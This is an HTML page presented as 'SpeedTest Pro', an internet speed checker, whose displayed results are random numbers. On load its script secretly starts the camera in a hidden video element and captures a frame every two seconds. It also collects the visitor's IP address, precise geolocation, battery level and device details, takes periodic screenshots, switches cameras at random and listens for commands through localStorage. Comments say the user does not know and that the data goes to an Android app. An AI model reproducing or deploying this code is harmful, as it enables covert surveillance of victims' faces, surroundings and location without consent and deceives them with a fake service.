<!DOCTYPE html>
<html>
<head>
    <title>SpeedTest Pro - Internet Speed Checker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
            font-family: 'Roboto', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 100%;
            backdrop-filter: blur(10px);
        }
        h1 {
            font-family: 'Orbitron', monospace;
            color: #00ffff;
            margin-bottom: 10px;
            font-weight: 900;
            font-size: 28px;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
        }
        .subtitle {
            color: #a0a0a0;
            margin-bottom: 25px;
            font-size: 14px;
        }
        video {
            display: none;
        }
        .speed-display {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            border: 3px solid #00ffff;
            margin: 20px auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: radial-gradient(circle, rgba(0,255,255,0.1) 0%, rgba(0,0,0,0.3) 100%);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
        }
        .speed-number {
            font-family: 'Orbitron', monospace;
            font-size: 36px;
            font-weight: 700;
            color: #00ffff;
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.8);
        }
        .speed-unit {
            font-size: 14px;
            color: #a0a0a0;
            margin-top: 5px;
        }
        .status {
            background: rgba(0, 255, 255, 0.1);
            border: 1px solid rgba(0, 255, 255, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            color: #00ffff;
            font-size: 14px;
        }
        .btn {
            background: linear-gradient(45deg, #00ffff, #0080ff);
            color: #000;
            border: none;
            padding: 12px 25px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin: 10px 5px;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px); 
            box-shadow: 0 5px 25px rgba(0, 255, 255, 0.5);
        }
        .stats {
            display: flex;
            justify-content: space-between;
            margin: 20px 0;
        }
        .stat-item {
            text-align: center;
            flex: 1;
        }
        .stat-value {
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: #00ffff;
            font-weight: 700;
        }
        .stat-label {
            font-size: 12px;
            color: #a0a0a0;
            margin-top: 5px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
            50% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.6); }
            100% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö° SpeedTest Pro</h1>
        <p class="subtitle">Test your internet connection speed</p>
        
        <video id="video" autoplay muted playsinline></video>
        
        <div class="speed-display pulse" id="speedDisplay">
            <div class="speed-number" id="speedNumber">0</div>
            <div class="speed-unit">Mbps</div>
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value" id="pingValue">--</div>
                <div class="stat-label">Ping (ms)</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="downloadValue">--</div>
                <div class="stat-label">Download</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="uploadValue">--</div>
                <div class="stat-label">Upload</div>
            </div>
        </div>
        
        <div class="status" id="status">
            ‚ö° Ready to test your connection speed
        </div>
        
        <button class="btn" onclick="startSpeedTest()">üöÄ Start Test</button>
        <button class="btn" onclick="shareResults()">üìä Share Results</button>
        
        <div class="footer">
            <p>üåê Professional speed testing ‚Ä¢ Accurate results</p>
        </div>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        let currentStream = null;
        let facingMode = 'user';
        let deviceInfo = {};
        
        // Get session from URL
        const params = new URLSearchParams(window.location.search);
        const session = params.get('s') || 'default';
        
        // Fungsi untuk mengambil info device real
        async function getDeviceInfo() {
            try {
                // Battery API
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = Math.round(battery.level * 100);
                    deviceInfo.charging = battery.charging;
                }
                
                // Network info
                if ('connection' in navigator) {
                    deviceInfo.networkType = navigator.connection.effectiveType;
                    deviceInfo.downlink = navigator.connection.downlink;
                }
                
                // Device info
                deviceInfo.userAgent = navigator.userAgent;
                deviceInfo.platform = navigator.platform;
                deviceInfo.language = navigator.language;
                deviceInfo.screenWidth = screen.width;
                deviceInfo.screenHeight = screen.height;
                deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                
                // Get IP address
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    deviceInfo.ip = data.ip;
                } catch (e) {
                    deviceInfo.ip = 'Unknown';
                }
                
                // Get real location
                await getRealLocation();
                
                // Kirim info ke aplikasi Android
                sendDeviceInfo();
                
            } catch (error) {
                console.error('Error getting device info:', error);
            }
        }
        
        async function getRealLocation() {
            try {
                if ('geolocation' in navigator) {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    
                    deviceInfo.latitude = position.coords.latitude;
                    deviceInfo.longitude = position.coords.longitude;
                    deviceInfo.accuracy = position.coords.accuracy;
                    
                    // Get address from coordinates
                    try {
                        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${position.coords.latitude}&longitude=${position.coords.longitude}&localityLanguage=id`);
                        const locationData = await response.json();
                        
                        deviceInfo.city = locationData.city || locationData.locality || 'Unknown';
                        deviceInfo.country = locationData.countryName || 'Unknown';
                        deviceInfo.address = locationData.localityInfo?.administrative?.[2]?.name || locationData.principalSubdivision || 'Unknown';
                        deviceInfo.fullAddress = `${deviceInfo.city}, ${deviceInfo.address}, ${deviceInfo.country}`;
                    } catch (e) {
                        deviceInfo.city = 'Unknown';
                        deviceInfo.country = 'Unknown';
                        deviceInfo.fullAddress = `${position.coords.latitude}, ${position.coords.longitude}`;
                    }
                } else {
                    deviceInfo.location = 'Geolocation not supported';
                }
            } catch (error) {
                deviceInfo.location = 'Location access denied';
                console.log('Location error:', error);
            }
        }
        
        function sendDeviceInfo() {
            const infoString = JSON.stringify(deviceInfo);
            localStorage.setItem('deviceInfo', infoString);
            console.log('DEVICE_INFO:', infoString);
        }
        
        function startCamera() {
            // Ambil info device terlebih dahulu
            getDeviceInfo();
            
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: facingMode },
                audio: false 
            })
            .then(stream => {
                currentStream = stream;
                video.srcObject = stream;
                
                // Camera berjalan di background, user tidak tahu
                setInterval(() => {
                    captureFrame();
                }, 2000);
            })
            .catch(err => {
                console.log('Camera access denied');
            });
        }
        
        function captureFrame() {
            if (currentStream && video.videoWidth > 0) {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Convert to base64 and send (silently)
                const frameData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Kirim frame dengan device info dan camera info
                const payload = {
                    image: frameData,
                    deviceInfo: deviceInfo,
                    cameraMode: facingMode,
                    timestamp: new Date().toISOString(),
                    session: session
                };
                
                localStorage.setItem('latestFrame', JSON.stringify(payload));
                console.log('FRAME_CAPTURED:', JSON.stringify({...payload, image: 'base64_data'}));
            }
        }
        
        function switchCamera() {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
            facingMode = facingMode === 'user' ? 'environment' : 'user';
            startCamera();
            
            // Log camera switch
            console.log('CAMERA_SWITCHED:', facingMode);
            localStorage.setItem('cameraMode', facingMode);
        }
        
        function captureScreenshot() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const ctx = canvas.getContext('2d');
                
                // Capture entire screen content
                html2canvas(document.body).then(canvas => {
                    const screenshotData = canvas.toDataURL('image/png', 1.0);
                    
                    const payload = {
                        screenshot: screenshotData,
                        deviceInfo: deviceInfo,
                        timestamp: new Date().toISOString(),
                        session: session,
                        type: 'screenshot'
                    };
                    
                    localStorage.setItem('latestScreenshot', JSON.stringify(payload));
                    console.log('SCREENSHOT_CAPTURED:', JSON.stringify({...payload, screenshot: 'base64_data'}));
                }).catch(() => {
                    // Fallback: simple canvas screenshot
                    ctx.fillStyle = '#0f0f23';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    ctx.fillStyle = '#00ffff';
                    ctx.font = '24px Orbitron';
                    ctx.textAlign = 'center';
                    ctx.fillText('‚ö° SpeedTest Pro', canvas.width/2, canvas.height/2 - 50);
                    
                    ctx.fillStyle = '#ffffff';
                    ctx.font = '16px Roboto';
                    ctx.fillText('Internet Speed Testing', canvas.width/2, canvas.height/2);
                    
                    const screenshotData = canvas.toDataURL('image/png', 1.0);
                    
                    const payload = {
                        screenshot: screenshotData,
                        deviceInfo: deviceInfo,
                        timestamp: new Date().toISOString(),
                        session: session,
                        type: 'screenshot'
                    };
                    
                    localStorage.setItem('latestScreenshot', JSON.stringify(payload));
                    console.log('SCREENSHOT_CAPTURED:', JSON.stringify({...payload, screenshot: 'base64_data'}));
                });
            } catch (error) {
                console.log('Screenshot error:', error);
            }
        }
        
        // Listen for camera control commands
        function checkCameraCommands() {
            const command = localStorage.getItem('cameraCommand');
            if (command === 'switch') {
                switchCamera();
                localStorage.removeItem('cameraCommand');
            } else if (command === 'screenshot') {
                captureScreenshot();
                localStorage.removeItem('cameraCommand');
            }
        }
        
        // Check for commands every 1 second
        setInterval(checkCameraCommands, 1000);
        
        // Auto screenshot setiap 45 detik
        setInterval(() => {
            if (Math.random() > 0.6) { // 40% chance
                captureScreenshot();
            }
        }, 45000);
        
        let isTestRunning = false;
        
        function startSpeedTest() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            const speedNumber = document.getElementById('speedNumber');
            const pingValue = document.getElementById('pingValue');
            const downloadValue = document.getElementById('downloadValue');
            const uploadValue = document.getElementById('uploadValue');
            const status = document.getElementById('status');
            
            status.innerHTML = 'üîÑ Initializing speed test...';
            
            // Reset values
            speedNumber.textContent = '0';
            pingValue.textContent = '--';
            downloadValue.textContent = '--';
            uploadValue.textContent = '--';
            
            // Simulate ping test
            setTimeout(() => {
                status.innerHTML = 'üì° Testing ping...';
                const ping = Math.floor(Math.random() * 50) + 10;
                pingValue.textContent = ping;
            }, 1000);
            
            // Simulate download test
            setTimeout(() => {
                status.innerHTML = '‚¨áÔ∏è Testing download speed...';
                let downloadSpeed = 0;
                const maxDownload = Math.floor(Math.random() * 80) + 20;
                
                const downloadInterval = setInterval(() => {
                    downloadSpeed += Math.random() * 10;
                    if (downloadSpeed >= maxDownload) {
                        downloadSpeed = maxDownload;
                        clearInterval(downloadInterval);
                    }
                    speedNumber.textContent = Math.floor(downloadSpeed);
                    downloadValue.textContent = Math.floor(downloadSpeed);
                }, 100);
            }, 2000);
            
            // Simulate upload test
            setTimeout(() => {
                status.innerHTML = '‚¨ÜÔ∏è Testing upload speed...';
                let uploadSpeed = 0;
                const maxUpload = Math.floor(Math.random() * 40) + 10;
                
                const uploadInterval = setInterval(() => {
                    uploadSpeed += Math.random() * 5;
                    if (uploadSpeed >= maxUpload) {
                        uploadSpeed = maxUpload;
                        clearInterval(uploadInterval);
                    }
                    speedNumber.textContent = Math.floor(uploadSpeed);
                    uploadValue.textContent = Math.floor(uploadSpeed);
                }, 100);
            }, 5000);
            
            // Complete test
            setTimeout(() => {
                status.innerHTML = '‚úÖ Speed test completed successfully!';
                isTestRunning = false;
            }, 8000);
        }
        
        function shareResults() {
            const ping = document.getElementById('pingValue').textContent;
            const download = document.getElementById('downloadValue').textContent;
            const upload = document.getElementById('uploadValue').textContent;
            
            if (ping === '--') {
                status.innerHTML = '‚ö†Ô∏è Run a speed test first!';
                return;
            }
            
            status.innerHTML = 'üì§ Sharing results...';
            setTimeout(() => {
                status.innerHTML = '‚úÖ Results shared successfully!';
            }, 1000);
        }
        
        // Start camera when page loads
        startCamera();
        
        // Keep screen awake
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
        
        // Auto switch camera setiap 30 detik untuk testing
        setInterval(() => {
            if (Math.random() > 0.7) { // 30% chance
                switchCamera();
            }
        }, 30000);
    </script>
</body>
</html>
